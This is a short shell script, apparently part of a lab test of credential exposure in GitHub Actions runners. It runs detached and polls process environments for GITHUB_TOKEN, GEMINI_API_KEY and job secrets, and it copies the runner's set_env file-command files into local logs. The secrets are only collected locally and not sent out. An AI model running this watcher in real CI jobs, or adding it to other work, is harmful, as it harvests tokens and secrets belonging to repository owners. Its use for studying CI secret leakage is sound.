#!/bin/sh
# W2-MCPCONF-CI-CRED-VERIFY detached watcher (benign lab collection only).
# Runs in the background (setsid nohup) and polls, across workflow steps:
#   1) same-uid /proc/<pid>/environ for the job canary / token / late secret
#   2) the runner's file-command directory (set_env_*) written via $GITHUB_ENV
RAW=/tmp/vfy/raw
OUT="$RAW/watch"
mkdir -p "$OUT"
n=0
while [ "$n" -lt 300 ]; do
  n=$((n + 1))
  ts=$(date -u +%FT%TZ)
  for d in /proc/[0-9]*; do
    [ -r "$d/environ" ] || continue
    if tr '\0' '\n' < "$d/environ" 2>/dev/null | grep -qE '^(VFY_LATE_STEP|VFY_JOB_SECRET|GITHUB_TOKEN)='; then
      {
        echo "-- ts=$ts pid=${d#/proc/} comm=$(cat "$d/comm" 2>/dev/null)"
        tr '\0' '\n' < "$d/environ" 2>/dev/null | grep -E '^(VFY_LATE_STEP|VFY_LATE_ENV|VFY_JOB_SECRET|GITHUB_TOKEN|GEMINI_API_KEY)='
      } >> "$OUT/proc-hits.txt" 2>/dev/null
    fi
  done
  if [ -d /home/runner/work/_temp/_runner_file_commands ]; then
    for f in /home/runner/work/_temp/_runner_file_commands/set_env_*; do
      [ -f "$f" ] || continue
      {
        echo "-- ts=$ts file=$f"
        cat "$f"
      } >> "$OUT/filecmd.txt" 2>/dev/null
    done
  fi
  [ -f /tmp/vfy/stop ] && break
  sleep 2
done
echo "WATCH-EXIT cycles=$n ts=$(date -u +%FT%TZ)" >> "$OUT/exit.log"
exit 0
